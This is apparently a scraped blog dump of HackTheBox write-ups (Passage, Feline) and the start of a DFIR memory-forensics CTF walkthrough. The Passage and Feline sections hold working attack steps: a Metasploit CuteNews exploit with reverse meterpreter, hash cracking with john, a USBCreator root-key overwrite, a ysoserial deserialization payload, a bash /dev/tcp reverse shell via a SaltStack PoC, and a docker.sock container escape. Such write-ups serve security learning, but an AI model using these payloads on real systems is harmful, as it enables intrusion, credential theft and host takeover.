&#x27;References&#x27; =&gt; [ [&#x27;URL&#x27;, &#x27;http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html&#x27;], // &lt;---- Add a comma here to fix [&#x27;URL&#x27;, &#x27;http://cutephp.com&#x27;] # Official Website First, we have to register a account Next, open up msfconsole, load the module we just added reload_all And this is our options msf5 exploit(linux/http/46698) &gt; optionsModule options (exploit/linux/http/46698): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD ikonw no Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.5.22 yes The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /CuteNews yes Base CutePHP directory path USERNAME ikonw yes Username to authenticate with VHOST no HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.6 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic msf5 exploit(linux/http/46698) &gt; run[*] Started reverse TCP handler on 10.10.14.6:4444 [*] http://10.129.5.22:80 - CuteNews is 2.1.2[+] Authentication was successful with user: ikonw[*] Trying to upload ouriwixb.php[+] Upload successfully.[*] Sending stage (38288 bytes) to 10.129.5.22[*] Meterpreter session 1 opened (10.10.14.6:4444 -&gt; 10.129.5.22:37850) at 2020-09-06 13:02:44 +0800 and we got the www-data user. We found 2 user nadav and paul www-data@passage:/home$ lslsnadav paul Went back to web directory for more enumeration, try to see if any config file stores the users cred Along the way we find out that CuteNews does not have database, all itâ€™s data are store in PHP. For convivence, I zip the whole web folder and download it to local for more analysis. in cdata&#x2F;users folder we found some base64 â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/passage/CuteNews/cdata/users]â””â”€# ls 09.php 16.php 32.php 42.php 5d.php 6c.php 73.php 7a.php 97.php b0.php c1.php d4.php d6.php fb.php lines0a.php 21.php 41.php 52.php 66.php 6e.php 77.php 8f.php 98.php b8.php c8.php d5.php e0.php fc.php users.txtâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/passage/CuteNews/cdata/users]â””â”€# cat 09.php&lt;?php die(&#x27;Direct call - access denied&#x27;); ?&gt;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319 We extract out all the base64 hash and decrypt it at one â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/passage/CuteNews/cdata/users]â””â”€# cat * | grep -v &#x27;&lt;?php&#x27; YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0= we can see that is all serialized objects. array ( &#x27;name&#x27; =&gt; array ( &#x27;admin&#x27; =&gt; array ( &#x27;id&#x27; =&gt; &#x27;1592483047&#x27;, &#x27;name&#x27; =&gt; &#x27;admin&#x27;, &#x27;acl&#x27; =&gt; &#x27;1&#x27;, &#x27;email&#x27; =&gt; &#x27;nadav@passage.htb&#x27;, &#x27;pass&#x27; =&gt; &#x27;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&#x27;, &#x27;lts&#x27; =&gt; &#x27;1592487988&#x27;, &#x27;ban&#x27; =&gt; &#x27;0&#x27;, &#x27;cnt&#x27; =&gt; &#x27;2&#x27;, ), ),) it contains email and password hash. went to hash.org and we know itâ€™s a sha256 hash. we collect all the hashes 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e14bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cdf669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc and we use john and rockyou to decrypt it â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Linux/passage]â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 passwordUsing default input encoding: UTF-8Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])Warning: poor OpenMP scalability for this hash type, consider --fork=4Will run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusatlanta1 (?)1g 0:00:00:01 DONE (2020-09-06 15:08) 0.8403g/s 12053Kp/s 12053Kc/s 48240KC/s (454579)..*7Â¡Vamos!Use the &quot;--show --format=Raw-SHA256&quot; options to display all of the cracked passwords reliablySession completed we got the password atlanta1 we manage su to paul account paul@passage:/var/www/html/CuteNews/cdata$ whoamiwhoamipaulpaul@passage:/var/www/html/CuteNews/cdata$ cd ~cd ~paul@passage:~$ lslsDesktop Downloads Music Public user.txtDocuments examples.desktop Pictures Templates Videospaul@passage:~$ cat user.txtcat user.txt3f0dfa31752b3222428868b631ebe589 After some enumeration authorized_keys only have one nadav value. That means key belongs nadav. This key can access to both nadav and paul paul@passage:~/.ssh$ cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage That means, nadav might have paulâ€™s public key. We get the id_rsa key from paul and we are in â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Linux/passage]â””â”€# ssh -i id_rsa nadav@10.129.5.22load pubkey &quot;id_rsa&quot;: invalid formatLast login: Sun Sep 6 00:21:36 2020 from 10.10.14.6nadav@passage:~$ RootAfter some enumeration from process list, we discover d-bus usbcreator is vulnerable to privilege escalation USBCreator D-Bus Privilege Escalation in Ubuntu Desktop We can directly overwrite arbitary files on the file system as root. Generate our own ssh key and write it to a file called ssh_key nadav@passage:~$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuSKqfg/WNLTFhnw+oY9nBwgoBZm4pRY0ZJHBykTQ9tU2XAR2AE1Hqzkqho7D1/b1sfSLOM1h53vxHzMewMO+xGxQ4n3xdoQmHy+BUJ8igkFlG630Jbu6AOJPU2vigmqr9rxdPSZCk5443tp8p4se2C9k7mOoYNZtRsHTuvq4uHOCOvlIaehIGDiI2zoatklvWdQ4dUDERM4gKo5U4VJ05DteQydkQuBKRTx4zYnO0+Tepkk424Q6aCaalwTfjFJTpEYRMLQrK6sGcijDJL2U/gHIjah3o8bR6aA5jy40P+3mFwMTW2lKAz+dhuyrtrBkvbiDeyrXBxAiDq/G5aiMTBVQA9vrfl0fpUGA2gY8/VqcuJ0cKWhSc3pzLzHO8dnElQD7+VCnJqRsxKjRMngJ5zJmyoIF/DRQZ2klnnW1chrFhi+kmegJuiQACjQqMiG8xgFJqJqy/jKbMMhNoul1y21Dx3de/K4c1LBsvYd0OGeckbLk7KDbxQ0snnVzKLDU= ikonw&quot; &gt; ssh_key Next called the dbus to overwrite to rootâ€™s authorized_keys nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/ssh_key /root/.ssh/authorized_keys true() and we got root â”Œâ”€â”€(rootğŸ’€kali)-[~/.ssh]â””â”€# ssh -i id_rsa root@10.129.5.22 127 â¨¯Last login: Sun Sep 6 02:23:55 2020 from 10.10.14.6root@passage:~# cat root.txt &amp;&amp; whoami &amp;&amp; hostnamead8b45d6ef52d901382e54b0d3ecb4adrootpassage","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"}]},{"title":"GitTalk 404 error","slug":"git_talk","date":"2020-09-05T00:00:00.000Z","updated":"2020-09-24T13:54:11.451Z","comments":true,"path":"2020/09/05/git_talk/","permalink":"https://ik0nw.github.io/2020/09/05/git_talk/","excerpt":"test","text":"test å› ä¸ºæ— èŠï¼Œæƒ³é‡‡ç”¨æ›´èŠ±é‡Œèƒ¡å“¨çš„åšå®¢ï¼Œå†³å®šç”¨äº†hexo+githubçš„é…ç½®ã€‚ æœŸé—´åœ¨disquså’Œgitalkä¹‹é—´é€‰æ‹©äº† gitalk,å› ä¸ºåè€…åœ¨å›½å†…æ¯”disqusèƒ½æ›´å¿«çš„è¿è¡Œã€‚ åœ¨ä½¿ç”¨gitalkä¸­ä¹Ÿæ˜¯é‡åˆ°äº†äº›è®¸é—®é¢˜ã€‚å…³äºå¦‚ä½•å®‰è£…gitalkæˆ‘å°±ä¸å¤šè¯´äº†ã€‚ é‡ç‚¹æ˜¯config æ–‡ä»¶é‡Œé…ç½®çš„é—®é¢˜ gitalk: # gitalk. https://gitalk.github.io/ owner: Ik0nw #å¿…é¡». GitHub repository æ‰€æœ‰è€…ï¼Œå¯ä»¥æ˜¯ä¸ªäººæˆ–è€…ç»„ç»‡ã€‚ admin: Ik0nw #å¿…é¡». GitHub repository çš„æ‰€æœ‰è€…å’Œåˆä½œè€… (å¯¹è¿™ä¸ª repository æœ‰å†™æƒé™çš„ç”¨æˆ·)ã€‚ repo: Ik0nw.github.io #å¿…é¡». GitHub repository. ClientID: xxxxx #å¿…é¡». GitHub Application Client ID. ClientSecret: xxxxx #å¿…é¡». GitHub Application Client Secret. ownerè·Ÿadmin å¡«å†™githubçš„ç”¨æˆ·å repoå¡«å†™çš„æ˜¯ä½ åšå®¢repoçš„åå­— è€Œä¸æ˜¯ç½‘å€ï¼ˆå‡å¦‚ä½ æ­£åœ¨ä½¿ç”¨åŸŸåçš„è¯ï¼‰ å…¶å®åˆ‡è®°ä½ çš„åšå®¢çš„repoä¸€å®šè¦è®¾ç½®ä¸ºå…¬å…±ï¼Œå¦‚æœè®¾ç½®ä¸ºç§æœ‰ï¼Œgitalkå°†æ— æ³•è®¿é—®ã€‚ ï¼ˆæˆ‘åœ¨è¿™é‡Œè½¬äº†1ä¸ªå¤šå°æ—¶ å“­â€¦.ï¼‰","categories":[],"tags":[{"name":"gitalk","slug":"gitalk","permalink":"https://ik0nw.github.io/tags/gitalk/"}]},{"title":"HTB Feline Writeup","slug":"HTB-Feline","date":"2020-08-30T00:00:00.000Z","updated":"2021-10-10T03:29:47.419Z","comments":true,"path":"2020/08/30/HTB-Feline/","permalink":"https://ik0nw.github.io/2020/08/30/HTB-Feline/","excerpt":"","text":"Author: IkonwNmap scan: Making a script scan on all ports Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 06:52 EDTNmap scan report for 10.10.10.205Host is up (0.0066s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)8080/tcp open http Apache Tomcat 9.0.27|_http-title: VirusBucketService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds The web seems something related to online malware analyze? only service are available Found out script.js is loaded let photo = document.getElementById(&quot;uploadFile&quot;).files[0];let req = new XMLHttpRequest();let email = document.getElementById(&quot;email&quot;).value;let formData = new FormData();formData.append(&quot;image&quot;, photo);await fetch(&#x27;/upload.jsp?email=&#x27; + email , &#123; method: &quot;POST&quot;, body: formData&#125;) .then(response=&gt;response.text()) .then(data=&gt;&#123; if(data.includes(&quot;successfully&quot;)) &#123; document.getElementById(&quot;msg&quot;).innerText = &quot;Upload successful! The report will be sent via e-mail.&quot;; &#125; else &#123; document.getElementById(&quot;msg&quot;).innerText = &quot;File upload failed&quot;; &#125; &#125;) .catch(function(error) &#123; document.getElementById(&quot;msg&quot;).innerText = &quot;File upload failed&quot;; &#125;); Not too interesting, it fetch the upload.jsp However if we upload an empty filename, it will cause the jsp to obtain an error. We found out the upload directory address &#x2F;opt&#x2F;samples&#x2F;uploads the upload directory is not within the web directory, I have no way to execute malicious payload and execute it through URL. After viewing the rating, it is a CVE-like Box. I donâ€™t see any CMS or suspicious port So I went to google about the Apache Tomcat 9.0.27 And I found CVE-2020-9484 It has some prerequisites for this vulnerability - The persistentManager is enabled and it&#x27;s using a *FileStore* (Not too sure if this is enabled)- The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded (We know the uploaded directory)- There are gadgets in the *classpath* that can be used for a java deserialization attack Docker environment First, we have to generate a deserialization object session using ysoserial Do take note that, due to Runtime.getRunTime().exec the arguments with spaces are broken by the StringTokenizer class. We have to use base64 to encoding to reduce these issues Reference â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/docker/ysoserial]â””â”€# java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 &quot;$command&quot; &gt; ~/Desktop/hackthebox/Linux/feline/xing.session Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true â”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# curl &#x27;http://10.129.6.132:8080/upload.jsp&#x27; -H &#x27;Cookie: JSESSIONID=../../../../../../../../opt/samples/uploads/xing&#x27; Using curl to pass the JSESSIONID and trigger the malicious session we sent. And we got the shell back. The user flag located at &#x2F;home&#x2F;tomcat&#x2F;user.txt RootVia enumeration of network connection we found out 2 suspicious port 4506 and 4505 tomcat@VirusBucket:/opt/tomcat$ netstat -ntlpnetstat -ntlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4505 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4506 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33443 0.0.0.0:* LISTEN - tcp6 0 0 :::8080 :::* LISTEN 975/java tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 127.0.0.1:8005 :::* LISTEN 975/java After google we found itâ€™s saltstack CVE-2020-11651 And we manage to find the CVE, after we upload the poc, we found the victim doesnâ€™t have python3 salt module. We do a port forwarding using chisel Chisel Github Client&gt;&gt; ./chisel_linux client &lt;your ip&gt;:&lt;Port&gt; -R:4506:127.0.0.1:4506Server&gt;&gt; ./chisel_linux server -p &lt;Port&gt; --reverse Now we have the target port 4506 forward to our port 7777 Run the POC and execute the bash reverse shell command. And we got the shell back python3 cve_2020-11651.py --exec &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.16/1234 0&gt;&amp;1&quot;&#x27; However we didnt root the box just so easy. We have the escape the docker environment, get to the host. root@2d24bf61767c:~# cat todo.txtcat todo.txt- Add saltstack support to auto-spawn sandbox dockers through events.- Integrate changes to tomcat and make the service open to public. After some enumeration, at the .bash_history cat todo.txt printf -- &#x27;- Add saltstack support to auto-spawn sandbox dockers through events.\\n- Integrate changes to tomcat and make the service open to public.\\n&#x27; &gt; todo.txtcd /home/tomcatcat /etc/passwdexitcd /root/lscat todo.txt ls -la /var/run/curl -s --unix-socket /var/run/docker.sock http://localhost/images/jsonexit &#x2F;var&#x2F;run&#x2F;docker.sock is used in this case. docker.sock is a unix socket of docker daemon listens on default, it can be used to communicate with the daemon from within a container. We are allow to send commands through the docker.sock to the docker daemon though API. that means, we can create a new docker which volume bind to the whole host folder and execute malicious commands. Escaping the Whale: Things you probably shouldnâ€™t do with Docker (Part 1) According the reference, first we have to get the current docker image curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json &#123; &quot;Id&quot;:&quot;2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2&quot;, &quot;Names&quot;:[ &quot;/saltstack&quot; ], &quot;Image&quot;:&quot;188a2704d8b0&quot;, &quot;ImageID&quot;:&quot;sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9&quot;, &quot;Command&quot;:&quot;/usr/bin/dumb-init /usr/local/bin/saltinit&quot;, &quot;Created&quot;:1593520419, &quot;Ports&quot;:[ &#123; &quot;IP&quot;:&quot;127.0.0.1&quot;, &quot;PrivatePort&quot;:4505, &quot;PublicPort&quot;:4505, &quot;Type&quot;:&quot;tcp&quot; &#125;, &#123; &quot;IP&quot;:&quot;127.0.0.1&quot;, &quot;PrivatePort&quot;:4506, &quot;PublicPort&quot;:4506, &quot;Type&quot;:&quot;tcp&quot; &#125;, &#123; &quot;IP&quot;:&quot;127.0.0.1&quot;, &quot;PrivatePort&quot;:8000, &quot;PublicPort&quot;:8000, &quot;Type&quot;:&quot;tcp&quot; &#125;, &#123; &quot;PrivatePort&quot;:22, &quot;Type&quot;:&quot;tcp&quot; &#125; ], &quot;Labels&quot;:&#123; &#125;, &quot;State&quot;:&quot;running&quot;, &quot;Status&quot;:&quot;Up 13 hours&quot;, &quot;HostConfig&quot;:&#123; &quot;NetworkMode&quot;:&quot;default&quot; &#125;, &quot;NetworkSettings&quot;:&#123; &quot;Networks&quot;:&#123; &quot;bridge&quot;:&#123; &quot;IPAMConfig&quot;:null, &quot;Links&quot;:null, &quot;Aliases&quot;:null, &quot;NetworkID&quot;:&quot;c344406a0931eb00e8d81114b992959ed104064affada4bc6932702e39c45141&quot;, &quot;EndpointID&quot;:&quot;a5e320e6a582086035e03f58b570d922c3c7c8be7f782222b47f7421b9bca4e5&quot;, &quot;Gateway&quot;:&quot;172.17.0.1&quot;, &quot;IPAddress&quot;:&quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;:16, &quot;IPv6Gateway&quot;:&quot;&quot;, &quot;GlobalIPv6Address&quot;:&quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;:0, &quot;MacAddress&quot;:&quot;02:42:ac:11:00:02&quot;, &quot;DriverOpts&quot;:null &#125; &#125; &#125;, &quot;Mounts&quot;:[ &#123; &quot;Type&quot;:&quot;bind&quot;, &quot;Source&quot;:&quot;/var/run/docker.sock&quot;, &quot;Destination&quot;:&quot;/var/run/docker.sock&quot;, &quot;Mode&quot;:&quot;&quot;, &quot;RW&quot;:true, &quot;Propagation&quot;:&quot;rprivate&quot; &#125; ] &#125;] Now we have the docker image name Letâ€™s create a json configuration file echo -e &#x27;&#123;&quot;Image&quot;:&quot;188a2704d8b0&quot;,&quot;Cmd&quot;:[&quot;/bin/sh&quot;],&quot;DetachKeys&quot;:&quot;Ctrl-p,Ctrl-q&quot;,&quot;OpenStdin&quot;:true,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/root&quot;,&quot;Target&quot;:&quot;/host_etc&quot;&#125;]&#125;&#x27; &gt; container.json and we create the image using the container.json configuration file curl -XPOST -H &quot;Content-Type: application/json&quot; --unix-socket /var/run/docker.sock -d &quot;$(cat container.json)&quot; http://localhost/containers/create Next start our malicious container curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/2aba/start replace the 32d862 to the image id your created after start the docker,use socat connect to the docker socket, however the machine doesnt have socat, we have to upload our own socat binary root@2d24bf61767c:~# which wgetwhich wget/usr/bin/wgetroot@2d24bf61767c:~# which socatwhich socatroot@2d24bf61767c:~# lslstodo.txtroot@2d24bf61767c:~# wget 10.10.14.16:1337/socatwget 10.10.14.16:1337/socat--2020-09-02 07:14:12-- http://10.10.14.16:1337/socatConnecting to 10.10.14.16:1337... connected.HTTP request sent, awaiting response... 200 OKLength: 375176 (366K) [application/octet-stream]Saving to: â€˜socatâ€™ 0K .......... .......... .......... .......... .......... 13% 2.99M 0s 50K .......... .......... .......... .......... .......... 27% 6.38M 0s 100K .......... .......... .......... .......... .......... 40% 32.3M 0s 150K .......... .......... .......... .......... .......... 54% 7.64M 0s 200K .......... .......... .......... .......... .......... 68% 12.8M 0s 250K .......... .......... .......... .......... .......... 81% 6.75M 0s 300K .......... .......... .......... .......... .......... 95% 522K 0s 350K .......... ...... 100% 135M=0.1s2020-09-02 07:14:12 (2.58 MB/s) - â€˜socatâ€™ saved [375176/375176]root@2d24bf61767c:~# chmod +x socatchmod +x socat socat - UNIX-CONNECT:/var/run/docker.sockPOST /containers/2aba/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1Host:Connection: UpgradeUpgrade: tcp and if it sucess, we receive HTTP/1.1 101 UPGRADEDContent-Type: application/vnd.docker.raw-streamConnection: UpgradeUpgrade: tcp and we are able to access the folder and get the root flag now.","categories":[{"name":"HackTheBox-Hard","slug":"HackTheBox-Hard","permalink":"https://ik0nw.github.io/categories/HackTheBox-Hard/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"hard","slug":"hard","permalink":"https://ik0nw.github.io/tags/hard/"}],"author":"Ikonw"},{"title":"Defcon DFIR memory forensic CTF 2019","slug":"Defcon-DFIR-memory_forensic","date":"2020-08-22T00:00:00.000Z","updated":"2020-09-20T06:49:56.604Z","comments":true,"path":"2020/08/22/Defcon-DFIR-memory_forensic/","permalink":"https://ik0nw.github.io/2020/08/22/Defcon-DFIR-memory_forensic/","excerpt":"","text":"Memory Image: https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0Question 1:What is the SHA1 hash of triage.mem?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solution:kali Desktop/forensic_images Â» sha1sum memory.mem c95e8cc8c946f95a109ea8e47a6800de10a27abd memory.mem Question 2:What profile is the most appropriate for this machine? (ex: Win10x86_14393)Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. The first step of volatility is always find the image info of the memory dump. kali Desktop/forensic_images Â» volatility imageinfo -f memory.mem Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/root/Desktop/forensic_images/memory.mem) PAE type : No PAE DTB : 0x187000L KDBG : 0xf800029f80a0L Number of Processors : 2 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff800029f9d00L KPCR for CPU 1 : 0xfffff880009ee000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2019-03-22 05:46:00 UTC+0000 Image local date and time : 2019-03-22 01:46:00 -0400 Got the answer as Win7SP1x64 Question 3:What was the process ID of notepad.exe?Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solution:We indicated the profile and use the pslist plugin to print all the running process kali Desktop/forensic_images Â» volatility -f memory.mem --profile=Win7SP1x64 pslist | grep notepadVolatility Foundation Volatility Framework 2.60xfffffa80054f9060 notepad.exe 3032 1432 1 60 1 0 2019-03-22 05:32:22 UTC+0000 and we got the answer pid as 3032 Question 4:Name the child processes of wscript.exe.Flag Format-flag&lt;xyz&gt;Everything after the â€“ is what you need to submit, your answer is the xyx. Solution:pstree will indicate child process using idention and periods. Letâ€™s grep the top and bottom 3 line of process wscript.exe kali Desktop/forensic_images Â» volatility -f 